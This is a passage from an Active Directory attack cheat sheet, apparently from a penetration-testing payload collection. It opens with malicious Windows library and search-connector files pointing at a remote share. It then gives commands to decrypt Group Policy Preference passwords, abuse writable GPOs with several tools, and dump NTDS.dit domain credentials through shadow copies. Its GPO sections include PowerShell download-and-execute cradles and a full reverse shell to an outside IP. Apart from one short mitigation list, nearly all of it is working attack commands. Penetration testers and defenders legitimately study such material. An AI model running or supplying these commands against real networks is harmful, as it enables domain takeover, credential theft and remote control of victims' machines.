<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;libraryDescription</span> <span style="color:#a6e22e">xmlns=</span><span style="color:#e6db74">&#34;&lt;http://schemas.microsoft.com/windows/2009/library&gt;&#34;</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;name&gt;</span>@windows.storage.dll,-34582<span style="color:#f92672">&lt;/name&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;version&gt;</span>6<span style="color:#f92672">&lt;/version&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;isLibraryPinned&gt;</span>true<span style="color:#f92672">&lt;/isLibraryPinned&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;iconReference&gt;</span>imageres.dll,-1003<span style="color:#f92672">&lt;/iconReference&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;templateInfo&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;folderType&gt;</span>{7d49d726-3c21-4f05-99aa-fdc2c9474656}<span style="color:#f92672">&lt;/folderType&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;/templateInfo&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;searchConnectorDescriptionList&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;searchConnectorDescription&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;isDefaultSaveLocation&gt;</span>true<span style="color:#f92672">&lt;/isDefaultSaveLocation&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;isSupported&gt;</span>false<span style="color:#f92672">&lt;/isSupported&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;simpleLocation&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;url&gt;</span>\\\\workstation@8888\\folder<span style="color:#f92672">&lt;/url&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&lt;/simpleLocation&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/searchConnectorDescription&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;/searchConnectorDescriptionList&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/libraryDescription&gt;</span>
</span></span></code></pre></div><h4 id="windows-search-connectors-files">
  Windows Search Connectors Files
  <a class="anchor" href="#windows-search-connectors-files">#</a>
</h4>
<blockquote>
<p>Windows Search Connectors (.searchConnector-ms)</p>
</blockquote>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;searchConnectorDescription</span> <span style="color:#a6e22e">xmlns=</span><span style="color:#e6db74">&#34;&lt;http://schemas.microsoft.com/windows/2009/searchConnector&gt;&#34;</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;iconReference&gt;</span>imageres.dll,-1002<span style="color:#f92672">&lt;/iconReference&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;description&gt;</span>Microsoft Outlook<span style="color:#f92672">&lt;/description&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;isSearchOnlyItem&gt;</span>false<span style="color:#f92672">&lt;/isSearchOnlyItem&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;includeInStartMenuScope&gt;</span>true<span style="color:#f92672">&lt;/includeInStartMenuScope&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;iconReference&gt;</span>\\\\workstation@8888\\folder.ico<span style="color:#f92672">&lt;/iconReference&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;templateInfo&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;folderType&gt;</span>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}<span style="color:#f92672">&lt;/folderType&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/templateInfo&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;simpleLocation&gt;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&lt;url&gt;</span>\\\\workstation@8888\\folder<span style="color:#f92672">&lt;/url&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;/simpleLocation&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/searchConnectorDescription&gt;</span>
</span></span></code></pre></div><h3 id="passwords-in-sysvol--group-policy-preferences">
  Passwords in SYSVOL &amp; Group Policy Preferences
  <a class="anchor" href="#passwords-in-sysvol--group-policy-preferences">#</a>
</h3>
<p>Find password in SYSVOL (MS14-025). SYSVOL is the domain-wide share in Active Directory to which all authenticated users have read access. All domain Group Policies are stored here: <code>\\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\Policies\</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>findstr /S /I cpassword \\&lt;FQDN&gt;\sysvol\&lt;FQDN&gt;\policies\*.xml
</span></span></code></pre></div><p>Decrypt a Group Policy Password found in SYSVOL (by <a href="https://twitter.com/0x00C651E0/status/956362334682849280">0x00C651E0</a>), using the 32-byte AES key provided by Microsoft in the <a href="https://msdn.microsoft.com/en-us/library/cc422924.aspx">MSDN - 2.2.1.1.4 Password Encryption</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;password_in_base64&#39;</span> | base64 -d | openssl enc -d -aes-256-cbc -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -iv <span style="color:#ae81ff">0000000000000000</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>e.g: 
</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;5OPdEKwZSf7dYAvLOe6RzRDtcvT/wCP8g5RqmAgjSso=&#39;</span> | base64 -d | openssl enc -d -aes-256-cbc -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -iv <span style="color:#ae81ff">0000000000000000</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&#39;</span> | base64 -d | openssl enc -d -aes-256-cbc -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -iv <span style="color:#ae81ff">0000000000000000</span>
</span></span></code></pre></div><h4 id="automate-the-sysvol-and-passwords-research">
  Automate the SYSVOL and passwords research
  <a class="anchor" href="#automate-the-sysvol-and-passwords-research">#</a>
</h4>
<ul>
<li>
<p><code>Metasploit</code> modules to enumerate shares and credentials</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>scanner<span style="color:#f92672">/</span>smb<span style="color:#f92672">/</span>smb_enumshares
</span></span><span style="display:flex;"><span>post<span style="color:#f92672">/</span>windows<span style="color:#f92672">/</span>gather<span style="color:#f92672">/</span>enum_shares
</span></span><span style="display:flex;"><span>post<span style="color:#f92672">/</span>windows<span style="color:#f92672">/</span>gather<span style="color:#f92672">/</span>credentials<span style="color:#f92672">/</span>gpp
</span></span></code></pre></div></li>
<li>
<p>CrackMapExec modules</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>cme smb <span style="color:#ae81ff">10.10</span>.10.10 -u Administrator -H <span style="color:#ae81ff">89</span>[...]<span style="color:#ae81ff">9d</span> -M gpp_autologin
</span></span><span style="display:flex;"><span>cme smb <span style="color:#ae81ff">10.10</span>.10.10 -u Administrator -H <span style="color:#ae81ff">89</span>[...]<span style="color:#ae81ff">9d</span> -M gpp_password
</span></span></code></pre></div></li>
<li>
<p><a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/Get-GPPPassword.py">Get-GPPPassword</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># with a NULL session</span>
</span></span><span style="display:flex;"><span>Get-GPPPassword.py -no-pass <span style="color:#e6db74">&#39;DOMAIN_CONTROLLER&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># with cleartext credentials</span>
</span></span><span style="display:flex;"><span>Get-GPPPassword.py <span style="color:#e6db74">&#39;DOMAIN&#39;</span>/<span style="color:#e6db74">&#39;USER&#39;</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#e6db74">&#39;PASSWORD&#39;</span>@<span style="color:#e6db74">&#39;DOMAIN_CONTROLLER&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># pass-the-hash</span>
</span></span><span style="display:flex;"><span>Get-GPPPassword.py -hashes <span style="color:#e6db74">&#39;LMhash&#39;</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#e6db74">&#39;NThash&#39;</span> <span style="color:#e6db74">&#39;DOMAIN&#39;</span>/<span style="color:#e6db74">&#39;USER&#39;</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#e6db74">&#39;PASSWORD&#39;</span>@<span style="color:#e6db74">&#39;DOMAIN_CONTROLLER&#39;</span>
</span></span></code></pre></div></li>
</ul>
<h4 id="mitigations-1">
  Mitigations
  <a class="anchor" href="#mitigations-1">#</a>
</h4>
<ul>
<li>Install <a href="https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2014/ms14-025">KB2962486</a> on every computer used to manage GPOs which prevents new credentials from being placed in Group Policy Preferences.</li>
<li>Delete existing GPP xml files in SYSVOL containing passwords.</li>
<li>Don’t put passwords in files that are accessible by all authenticated users.</li>
</ul>
<h3 id="exploit-group-policy-objects-gpo">
  Exploit Group Policy Objects GPO
  <a class="anchor" href="#exploit-group-policy-objects-gpo">#</a>
</h3>
<blockquote>
<p>Creators of a GPO are automatically granted explicit Edit settings, delete, modify security, which manifests as CreateChild, DeleteChild, Self, WriteProperty, DeleteTree, Delete, GenericRead, WriteDacl, WriteOwner</p>
</blockquote>
<p>:triangular_flag_on_post: GPO Priorization : Organization Unit &gt; Domain &gt; Site &gt; Local</p>
<p>GPO are stored in the DC in <code>\\&lt;domain.dns&gt;\SYSVOL\&lt;domain.dns&gt;\Policies\&lt;GPOName&gt;\</code>, inside two folders <strong>User</strong> and <strong>Machine</strong>.
If you have the right to edit the GPO you can connect to the DC and replace the files. Planned Tasks are located at <code>Machine\Preferences\ScheduledTasks</code>.</p>
<p>:warning: Domain members refresh group policy settings every 90 minutes by default but it can locally be forced with the following command: <code>gpupdate /force</code>.</p>
<h4 id="find-vulnerable-gpo">
  Find vulnerable GPO
  <a class="anchor" href="#find-vulnerable-gpo">#</a>
</h4>
<p>Look a GPLink where you have the <strong>Write</strong> right.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Get-DomainObjectAcl -Identity <span style="color:#e6db74">&#34;SuperSecureGPO&#34;</span> -ResolveGUIDs |  Where-Object {($_.ActiveDirectoryRights.ToString() <span style="color:#f92672">-match</span> <span style="color:#e6db74">&#34;GenericWrite|AllExtendedWrite|WriteDacl|WriteProperty|WriteMember|GenericAll|WriteOwner&#34;</span>)}
</span></span></code></pre></div><h4 id="abuse-gpo-with-sharpgpoabuse">
  Abuse GPO with SharpGPOAbuse
  <a class="anchor" href="#abuse-gpo-with-sharpgpoabuse">#</a>
</h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Build and configure SharpGPOAbuse</span>
</span></span><span style="display:flex;"><span>$ git clone https<span style="color:#960050;background-color:#1e0010">:</span>//github.com/FSecureLABS/SharpGPOAbuse
</span></span><span style="display:flex;"><span>$ Install-Package CommandLineParser -Version <span style="color:#ae81ff">1.9</span>.3.15
</span></span><span style="display:flex;"><span>$ ILMerge.exe /out<span style="color:#960050;background-color:#1e0010">:</span>C:\SharpGPOAbuse.exe C:\Release\SharpGPOAbuse.exe C:\Release\CommandLine.dll
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Adding User Rights</span>
</span></span><span style="display:flex;"><span>.\SharpGPOAbuse.exe --AddUserRights --UserRights <span style="color:#e6db74">&#34;SeTakeOwnershipPrivilege,SeRemoteInteractiveLogonRight&#34;</span> --UserAccount bob.smith --GPOName <span style="color:#e6db74">&#34;Vulnerable GPO&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Adding a Local Admin</span>
</span></span><span style="display:flex;"><span>.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount bob.smith --GPOName <span style="color:#e6db74">&#34;Vulnerable GPO&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Configuring a User or Computer Logon Script</span>
</span></span><span style="display:flex;"><span>.\SharpGPOAbuse.exe --AddUserScript --ScriptName StartupScript.bat --ScriptContents <span style="color:#e6db74">&#34;powershell.exe -nop -w hidden -c \&#34;</span>IEX ((new-object net.webclient).downloadstring(<span style="color:#e6db74">&#39;http://10.1.1.10:80/a&#39;</span>))\<span style="color:#e6db74">&#34;&#34;</span> --GPOName <span style="color:#e6db74">&#34;Vulnerable GPO&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Configuring a Computer or User Immediate Task</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># /!\ Intended to &#34;run once&#34; per GPO refresh, not run once per system</span>
</span></span><span style="display:flex;"><span>.\SharpGPOAbuse.exe --AddComputerTask --TaskName <span style="color:#e6db74">&#34;Update&#34;</span> --Author DOMAIN\Admin --Command <span style="color:#e6db74">&#34;cmd.exe&#34;</span> --Arguments <span style="color:#e6db74">&#34;/c powershell.exe -nop -w hidden -c \&#34;</span>IEX ((new-object net.webclient).downloadstring(<span style="color:#e6db74">&#39;http://10.1.1.10:80/a&#39;</span>))\<span style="color:#e6db74">&#34;&#34;</span> --GPOName <span style="color:#e6db74">&#34;Vulnerable GPO&#34;</span>
</span></span><span style="display:flex;"><span>.\SharpGPOAbuse.exe --AddComputerTask --GPOName <span style="color:#e6db74">&#34;VULNERABLE_GPO&#34;</span> --Author <span style="color:#e6db74">&#39;LAB.LOCAL\User&#39;</span> --TaskName <span style="color:#e6db74">&#34;EvilTask&#34;</span> --Arguments  <span style="color:#e6db74">&#34;/c powershell.exe -nop -w hidden -enc BASE64_ENCODED_COMMAND &#34;</span> --Command <span style="color:#e6db74">&#34;cmd.exe&#34;</span> --Force
</span></span></code></pre></div><h4 id="abuse-gpo-with-powergpoabuse">
  Abuse GPO with PowerGPOAbuse
  <a class="anchor" href="#abuse-gpo-with-powergpoabuse">#</a>
</h4>
<ul>
<li><a href="https://github.com/rootSySdk/PowerGPOAbuse">https://github.com/rootSySdk/PowerGPOAbuse</a></li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>PS&gt; . .\PowerGPOAbuse.ps1
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Adding a localadmin </span>
</span></span><span style="display:flex;"><span>PS&gt; Add-LocalAdmin -Identity <span style="color:#e6db74">&#39;Bobby&#39;</span> -GPOIdentity <span style="color:#e6db74">&#39;SuperSecureGPO&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Assign a new right </span>
</span></span><span style="display:flex;"><span>PS&gt; Add-UserRights -Rights <span style="color:#e6db74">&#34;SeLoadDriverPrivilege&#34;</span>,<span style="color:#e6db74">&#34;SeDebugPrivilege&#34;</span> -Identity <span style="color:#e6db74">&#39;Bobby&#39;</span> -GPOIdentity <span style="color:#e6db74">&#39;SuperSecureGPO&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Adding a New Computer/User script </span>
</span></span><span style="display:flex;"><span>PS&gt; Add-ComputerScript/Add-UserScript -ScriptName <span style="color:#e6db74">&#39;EvilScript&#39;</span> -ScriptContent $(Get-Content evil.ps1) -GPOIdentity <span style="color:#e6db74">&#39;SuperSecureGPO&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Create an immediate task </span>
</span></span><span style="display:flex;"><span>PS&gt; Add-GPOImmediateTask -TaskName <span style="color:#e6db74">&#39;eviltask&#39;</span> -Command <span style="color:#e6db74">&#39;powershell.exe /c&#39;</span> -CommandArguments <span style="color:#e6db74">&#34;&#39;</span>$(Get-Content evil.ps1)<span style="color:#e6db74">&#39;&#34;</span> -Author Administrator -Scope Computer/User -GPOIdentity <span style="color:#e6db74">&#39;SuperSecureGPO&#39;</span>
</span></span></code></pre></div><h4 id="abuse-gpo-with-pygpoabuse">
  Abuse GPO with pyGPOAbuse
  <a class="anchor" href="#abuse-gpo-with-pygpoabuse">#</a>
</h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$ git clone https<span style="color:#960050;background-color:#1e0010">:</span>//github.com/Hackndo/pyGPOAbuse
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Add john user to local administrators group (Password: H4x00r123..)</span>
</span></span><span style="display:flex;"><span>./pygpoabuse.py DOMAIN/user -hashes lm<span style="color:#960050;background-color:#1e0010">:</span>nt -gpo-id <span style="color:#e6db74">&#34;12345677-ABCD-9876-ABCD-123456789012&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Reverse shell example</span>
</span></span><span style="display:flex;"><span>./pygpoabuse.py DOMAIN/user -hashes lm<span style="color:#960050;background-color:#1e0010">:</span>nt -gpo-id <span style="color:#e6db74">&#34;12345677-ABCD-9876-ABCD-123456789012&#34;</span> \ 
</span></span><span style="display:flex;"><span>    -powershell \ 
</span></span><span style="display:flex;"><span>    -command <span style="color:#e6db74">&#34;\</span>$client<span style="color:#e6db74"> = New-Object System.Net.Sockets.TCPClient(&#39;10.20.0.2&#39;,1234);\</span>$stream<span style="color:#e6db74"> = \</span>$client<span style="color:#e6db74">.GetStream();[byte[]]\</span>$bytes<span style="color:#e6db74"> = 0..65535|%{0};while((\</span>$i<span style="color:#e6db74"> = \</span>$stream<span style="color:#e6db74">.Read(\</span>$bytes<span style="color:#e6db74">, 0, \</span>$bytes<span style="color:#e6db74">.Length)) -ne 0){;\</span>$data<span style="color:#e6db74"> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\</span>$bytes<span style="color:#e6db74">,0, \</span>$i<span style="color:#e6db74">);\</span>$sendback<span style="color:#e6db74"> = (iex \</span>$data<span style="color:#e6db74"> 2&gt;&amp;1 | Out-String );\</span>$sendback2<span style="color:#e6db74"> = \</span>$sendback<span style="color:#e6db74"> + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;\</span>$sendbyte<span style="color:#e6db74"> = ([text.encoding]::ASCII).GetBytes(\</span>$sendback2<span style="color:#e6db74">);\</span>$stream<span style="color:#e6db74">.Write(\</span>$sendbyte<span style="color:#e6db74">,0,\</span>$sendbyte<span style="color:#e6db74">.Length);\</span>$stream<span style="color:#e6db74">.Flush()};\</span>$client<span style="color:#e6db74">.Close()&#34;</span> \ 
</span></span><span style="display:flex;"><span>    -taskname <span style="color:#e6db74">&#34;Completely Legit Task&#34;</span> \
</span></span><span style="display:flex;"><span>    -description <span style="color:#e6db74">&#34;Dis is legit, pliz no delete&#34;</span> \ 
</span></span><span style="display:flex;"><span>    -user
</span></span></code></pre></div><h4 id="abuse-gpo-with-powerview">
  Abuse GPO with PowerView
  <a class="anchor" href="#abuse-gpo-with-powerview">#</a>
</h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Enumerate GPO</span>
</span></span><span style="display:flex;"><span>Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># New-GPOImmediateTask to push an Empire stager out to machines via VulnGPO</span>
</span></span><span style="display:flex;"><span>New-GPOImmediateTask -TaskName Debugging -GPODisplayName VulnGPO -CommandArguments <span style="color:#e6db74">&#39;-NoP -NonI -W Hidden -Enc AAAAAAA...&#39;</span> -Force
</span></span></code></pre></div><h4 id="abuse-gpo-with-standin">
  Abuse GPO with StandIn
  <a class="anchor" href="#abuse-gpo-with-standin">#</a>
</h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Add a local administrator</span>
</span></span><span style="display:flex;"><span>StandIn.exe --gpo --filter Shards --localadmin user002
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Set custom right to a user</span>
</span></span><span style="display:flex;"><span>StandIn.exe --gpo --filter Shards --setuserrights user002 --grant <span style="color:#e6db74">&#34;SeDebugPrivilege,SeLoadDriverPrivilege&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Execute a custom command</span>
</span></span><span style="display:flex;"><span>StandIn.exe --gpo --filter Shards --tasktype computer --taskname Liber --author <span style="color:#e6db74">&#34;REDHOOK\Administrator&#34;</span> --command <span style="color:#e6db74">&#34;C:\I\do\the\thing.exe&#34;</span> --args <span style="color:#e6db74">&#34;with args&#34;</span>
</span></span></code></pre></div><h3 id="dumping-ad-domain-credentials">
  Dumping AD Domain Credentials
  <a class="anchor" href="#dumping-ad-domain-credentials">#</a>
</h3>
<p>You will need the following files to extract the ntds :</p>
<ul>
<li>NTDS.dit file</li>
<li>SYSTEM hive (<code>C:\Windows\System32\SYSTEM</code>)</li>
</ul>
<p>Usually you can find the ntds in two locations : <code>systemroot\NTDS\ntds.dit</code> and <code>systemroot\System32\ntds.dit</code>.</p>
<ul>
<li><code>systemroot\NTDS\ntds.dit</code> stores the database that is in use on a domain controller. It contains the values for the domain and a replica of the values for the forest (the Configuration container data).</li>
<li><code>systemroot\System32\ntds.dit</code> is the distribution copy of the default directory that is used when you install Active Directory on a server running Windows Server 2003 or later to create a domain controller. Because this file is available, you can run the Active Directory Installation Wizard without having to use the server operating system CD.</li>
</ul>
<p>However you can change the location to a custom one, you will need to query the registry to get the current location.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>reg query HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters /v <span style="color:#e6db74">&#34;DSA Database file&#34;</span>
</span></span></code></pre></div><h4 id="using-ndtsutil">
  Using ndtsutil
  <a class="anchor" href="#using-ndtsutil">#</a>
</h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>C:\&gt;ntdsutil
</span></span><span style="display:flex;"><span>ntdsutil<span style="color:#960050;background-color:#1e0010">:</span> activate instance ntds
</span></span><span style="display:flex;"><span>ntdsutil<span style="color:#960050;background-color:#1e0010">:</span> ifm
</span></span><span style="display:flex;"><span>ifm<span style="color:#960050;background-color:#1e0010">:</span> create full c:\pentest
</span></span><span style="display:flex;"><span>ifm<span style="color:#960050;background-color:#1e0010">:</span> quit
</span></span><span style="display:flex;"><span>ntdsutil<span style="color:#960050;background-color:#1e0010">:</span> quit
</span></span></code></pre></div><p>or</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>ntdsutil <span style="color:#e6db74">&#34;ac i ntds&#34;</span> <span style="color:#e6db74">&#34;ifm&#34;</span> <span style="color:#e6db74">&#34;create full c:\temp&#34;</span> q q
</span></span></code></pre></div><h4 id="using-vshadow">
  Using Vshadow
  <a class="anchor" href="#using-vshadow">#</a>
</h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>vssadmin create shadow /<span style="color:#66d9ef">for</span>=C <span style="color:#960050;background-color:#1e0010">:</span>
</span></span><span style="display:flex;"><span>Copy Shadow_Copy_Volume_Name\windows\ntds\ntds.dit c:\ntds.dit
</span></span></code></pre></div><p>You can also use the Nishang script, available at : <a href="https://github.com/samratashok/nishang">https://github.com/samratashok/nishang</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Import-Module .\Copy-VSS.ps1
</span></span><span style="display:flex;"><span>Copy-VSS
</span></span><span style="display:flex;"><span>Copy-VSS -DestinationDir C:\ShadowCopy\
</span></span></code></pre></div><h4 id="using-vssadmin">
  Using vssadmin
  <a class="anchor" href="#using-vssadmin">#</a>
</h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>vssadmin create shadow /<span style="color:#66d9ef">for</span>=C:
</span></span><span style="display:flex;"><span>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\ShadowCopy
</span></span><span style="display:flex;"><span>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\ShadowCopy
</span></span></code></pre></div><h4 id="using-diskshadow-a-windows-signed-binary">
  Using DiskShadow (a Windows signed binary)
  <a class="anchor" href="#using-diskshadow-a-windows-signed-binary">#</a>
</h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>diskshadow.txt contains <span style="color:#960050;background-color:#1e0010">:</span>
</span></span><span style="display:flex;"><span>set context persistent nowriters
</span></span><span style="display:flex;"><span>add volume c: alias someAlias
</span></span><span style="display:flex;"><span>create
</span></span><span style="display:flex;"><span>expose <span style="color:#66d9ef">%</span>someAlias% z:
</span></span><span style="display:flex;"><span>exec <span style="color:#e6db74">&#34;cmd.exe&#34;</span> /c copy z:\windows\ntds\ntds.dit c:\exfil\ntds.dit
</span></span><span style="display:flex;"><span>delete shadows volume <span style="color:#66d9ef">%</span>someAlias%
</span></span><span style="display:flex;"><span>reset
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>then<span style="color:#960050;background-color:#1e0010">:</span>
</span></span><span style="display:flex;"><span>NOTE - must be executed from C:\Windows\System32
</span></span><span style="display:flex;"><span>diskshadow.exe /s  c:\diskshadow.txt
</span></span><span style="display:flex;"><span>dir c:\exfil
</span></span><span style="display:flex;"><span>reg.exe save hklm\system c:\exfil\system.bak
</span></span></code></pre></div><h4 id="using-esentutlexe">
  Using esentutl.exe
  <a class="anchor" href="#using-esentutlexe">#</a>
</h4>
<p>Copy/extract a locked file such as the AD Database</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>esentutl.exe /y /vss c:\windows\ntds\ntds.dit /d c:\folder\ntds.dit
